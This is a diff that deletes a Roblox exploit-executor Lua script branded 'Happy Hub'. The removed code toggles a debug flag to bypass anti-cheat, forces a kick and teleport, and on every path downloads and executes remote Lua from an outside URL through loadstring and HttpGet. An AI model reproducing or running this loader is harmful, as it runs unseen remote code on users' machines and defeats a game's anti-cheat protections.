@@ -1,17 +1,1 @@
-local s, fflag = pcall(getfflag, "DebugRunParallelLuaOnMainThread")
 
-if s then
-	if tostring(fflag) ~= "true" then
-		setfflag("DebugRunParallelLuaOnMainThread", "True")
-		game:GetService("Players").LocalPlayer:Kick("[Happy Hub]: Bypassing AC plase wait..")
-		task.wait()
-		queue_on_teleport([[
-			loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/f004392a8d699175ab966a303c95e6122cc727525b5eaa4347e9ee5db6b39329/download"))()
-		]])
-		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game:GetService("Players").LocalPlayer)
-		return
-	end
-end
-
-
-loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/f004392a8d699175ab966a303c95e6122cc727525b5eaa4347e9ee5db6b39329/download"))()
